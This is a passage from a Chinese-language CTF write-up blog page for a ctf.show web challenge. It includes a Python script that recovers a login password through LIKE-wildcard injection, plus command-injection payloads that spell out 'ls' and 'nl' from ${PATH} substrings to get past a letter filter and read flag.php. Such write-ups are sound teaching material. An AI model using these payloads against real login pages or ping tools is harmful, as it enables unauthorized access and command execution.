+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://181212cc-c071-4223-a4d7-5c3f4b556aac.challenge.ctf.show:8080/login.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;yu22x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&#123;0&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">fuzz = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> fuzz:</span><br><span class="line">        req = requests.post(url=url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yu22x&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(res+j+<span class="string">&quot;_&quot;</span>*(<span class="number">31</span>-i))&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">             res += j</span><br><span class="line">             <span class="comment">#print(res + j + &quot;_&quot; * (31 - i))</span></span><br><span class="line">             <span class="built_in">print</span>(res)</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>得到密码为：</p>
+<p><img src="7.png"></p>
+<p>登录进去，发现是一个命令执行的界面，输入ip执行ping命令，尝试输入127.0.0.1，返回正确的结果，并且似乎把所有小写字母都过滤了，还有一些“&amp;”和“|”之类的。</p>
+<p>想要读取目录，就需要构造出查询的语句：</p>
+<p>环境变量  +linux字符串截取  + 通配符。这里使用Linux中的**$PATH环境变量来截取字母**。</p>
+<p><img src="6.png"></p>
+<p>比如${PATH:5:1}，表示从第五个字符开始，截取一位（注：字符串从0开始），所以截取到的应该是“l”，同理${PATH:2:1}是截取个“s”:</p>
+<p>127.0.0.1;${PATH:5:1}${PATH:2:1}</p>
+<p><img src="8.png"></p>
+<p>尝试使用nl命令读取flag.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>;$&#123;PATH:<span class="number">14</span>:<span class="number">1</span>&#125;$&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125; ????.???</span><br></pre></td></tr></table></figure>
+
+<p>执行后在源码处得到flag：</p>
+<p><img src="9.png"></p>
+<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/N0ri/p/14331838.html">https://www.cnblogs.com/N0ri/p/14331838.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/116353054">https://blog.csdn.net/qq_44657899/article/details/116353054</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-%E6%AD%A4%E5%A4%9C%E5%9C%86"><span class="toc-number">1.</span> <span class="toc-text">web1_此夜圆</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.1.</span> <span class="toc-text">进行代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%9A%84%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">题目的具体分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2-%E6%95%85%E4%BA%BA%E5%BF%83"><span class="toc-number">2.</span> <span class="toc-text">web2_故人心</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">分析代码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%98%AF%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%82%B9"><span class="toc-number">2.1.1.</span> <span class="toc-text">首先是第一个点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%82%B9"><span class="toc-number">2.1.2.</span> <span class="toc-text">第二点</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">第三个点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E5%8F%82%E8%80%83"><span class="toc-number">2.2.1.</span> <span class="toc-text">文章参考</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web3-%E8%8E%AB%E8%B4%9F%E5%A9%B5%E5%A8%9F"><span class="toc-number">3.</span> <span class="toc-text">web3_莫负婵娟</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.0.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
